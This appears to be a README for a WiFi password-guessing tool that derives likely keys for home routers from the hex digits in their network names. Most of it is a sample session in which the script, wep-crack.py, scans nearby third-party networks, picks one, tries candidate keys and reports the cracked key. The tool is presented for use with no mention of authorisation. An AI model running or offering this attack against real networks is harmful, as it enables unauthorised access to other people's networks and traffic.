WiFi Password Guessing
======================

These scripts exploit the lack of entropy (as in randomness) exhibited by many 
common access points.  Those with SSID (network names) that end with 4 or 6 
hexadecimal digita, e.g. CYTA22B481,  BTHomeHub-D1D1, O2wireless8FE2F6.

They don't actually do any clever WEP-related exploit, they simply use the SSID 
to guess a handful of possible passwords, and then tries them in sequence.  See 
the example session below where a network was selected and the password 
successfully found in 43 seconds.

In theory, this will work with any form of encryption.  If you can guess the 
password, what good is encryption?

This exploit is based on the following posts:

http://209.85.135.104/search?q=cache:MGlJn9Cl2cwJ:www.networksecurityarchive.org/html/Vuln-Dev/2008-06/msg00303.html+mdap+network&hl=en&ct=clnk&cd=4&gl=uk&client=firefox-a

http://www.gnucitizen.org/blog/default-key-algorithm-in-thomson-and-bt-home-hub-routers/

Sample session
--------------

This session took 43 seconds from beginning to end::

    # sudo modprobe -r ipw2200; ./wep-crack.py ; beep
    INFO:root:WEP-crack starting
    INFO:root:User is not root, will restart as root
    INFO:root:WEP-crack starting
    INFO:root:User is root, good
    INFO:root:rtap0 interface not available
    WARNING:root:ipw2200 was not already loaded
    INFO:root:Reloaded ipw2200 with rtap0 interface
    INFO:root:Waiting for network list to be populated
    INFO:iwlist_parser:18 networks in range
    INFO:iwlist_parser:0 non-access-point networks removed from list
    INFO:iwlist_parser:3 non-encrypted networks removed from list
    INFO:iwlist_parser:7 WPA-encrypted networks removed from list
    Candidate networks, ordered by signal strength:
    0)      -67     SpeedTouchD8B3A5
    1)      -71     BTHomeHub-D1D1
    2)      -74     BTHomeHub-201F
    3)      -74     BTHomeHub-13E3
    4)      -75     O2wireless8FE2F6
    5)      -77     BTHomeHub-9E68
    6)      -80     BTHomeHub-E6AA
    7)      -82     O2wireless926FB1

    Select network to crack: 4
    Attempting to crack:
             ESSID: O2wireless8FE2F6
             BSSID: 00:1D:68:69:CF:5D
           channel: 1
            signal: -75

    Checking if DB contains any WEP keys for this network...
    Will search for keys matching ['8FE2F6']
    85.5MB 0:00:09 [8.65MB/s] [====================================================>] 100%
    Found 182 likely keys.
    [ 0 / 182 (0.0%) ] ETC: 0 seconds
    [ 1 / 182 (0.5%) ] ETC: 547 seconds
    [ 2 / 182 (1.1%) ] ETC: 545 seconds
    [ 3 / 182 (1.6%) ] ETC: 542 seconds
    [ 4 / 182 (2.2%) ] ETC: 539 seconds
    [ 5 / 182 (2.7%) ] ETC: 536 seconds
    There is already a pid file /var/run/dhclient.pid with pid 134519072

    Found key! Key for network O2wireless8FE2F6 is (hex): ABCDEF0123
    Leaving network in configured state and quitting
